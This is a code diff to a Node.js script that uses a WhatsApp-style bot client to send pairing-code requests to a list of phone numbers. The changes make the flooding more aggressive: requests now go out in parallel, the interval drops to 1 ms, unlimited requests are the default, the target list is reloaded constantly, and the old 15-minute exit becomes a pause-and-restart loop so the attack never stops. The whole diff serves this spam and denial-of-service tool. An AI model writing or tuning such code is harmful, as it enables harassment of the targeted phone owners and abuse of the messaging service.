@@ -4,7 +4,6 @@ const readline = require("readline");
 const fs = require('fs').promises;
 const path = require('path');
 const { fork } = require('child_process');
-const axios = require('axios');
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
@@ -23,17 +22,14 @@ async function fetchPhoneNumbers() {
 async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
     let requestCount = 0;
     while (xeonCodes === Infinity || requestCount < xeonCodes) {
-        for (let number of phoneNumbers) {
-            if (xeonCodes !== Infinity && requestCount >= xeonCodes) break;
-
+        await Promise.all(phoneNumbers.map(async (number) => {
+            if (xeonCodes !== Infinity && requestCount >= xeonCodes) return;
             try {
                 await XeonBotInc.requestPairingCode(number);
                 requestCount++;
             } catch (error) {
             }
-        }
-        if (xeonCodes === Infinity) {
-        }
+        }));
     }
 }
 
@@ -56,13 +52,10 @@ async function XeonProject() {
 
     try {
         let phoneNumbers = await fetchPhoneNumbers();
-        let previousPhoneNumbers = [...phoneNumbers];
-        let isChoiceMade = false;
         let xeonCodes;
 
         const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
         const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
-
         const choice = await Promise.race([choicePromise, timeoutPromise]);
 
         switch (choice) {
@@ -81,36 +74,30 @@ async function XeonProject() {
                 break;
         }
 
-        isChoiceMade = true;
-
         const requestInterval = setInterval(async () => {
             try {
                 phoneNumbers = await fetchPhoneNumbers();
                 await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
             } catch (error) {
             }
-        }, 10);
+        }, 1);
 
-        setInterval(async () => {
+        const updateInterval = setInterval(async () => {
             try {
-                const currentPhoneNumbers = await fetchPhoneNumbers();
-                const addedNumbers = currentPhoneNumbers.filter(number => !previousPhoneNumbers.includes(number));
-                const removedNumbers = previousPhoneNumbers.filter(number => !currentPhoneNumbers.includes(number));
-
-                if (addedNumbers.length > 0) {
-                }
-                if (removedNumbers.length > 0) {
-                }
-
-                previousPhoneNumbers = currentPhoneNumbers;
+                phoneNumbers = await fetchPhoneNumbers();
             } catch (error) {
             }
-        }, 10000);
+        }, 5000);
 
-        setTimeout(() => {
+        // استراحة كل 15 دقيقة
+        setInterval(() => {
+            console.log('Taking a short break for 5 minutes...');
             clearInterval(requestInterval);
-            process.exit(0);
-        }, 900000);
+            setTimeout(() => {
+                console.log('Resuming requests...');
+                XeonProject(); // إعادة تشغيل البرنامج بعد الاستراحة
+            }, 300000); // استراحة لمدة 5 دقائق
+        }, 900000); // كل 15 دقيقة
 
     } catch (error) {
     } finally {
@@ -120,9 +107,4 @@ async function XeonProject() {
     return XeonBotInc;
 }
 
-XeonProject().then(() => {
-    const scriptPath = path.resolve(__filename);
-    setTimeout(() => {
-        fork(scriptPath);
-    }, 1000);
-});
+XeonProject();
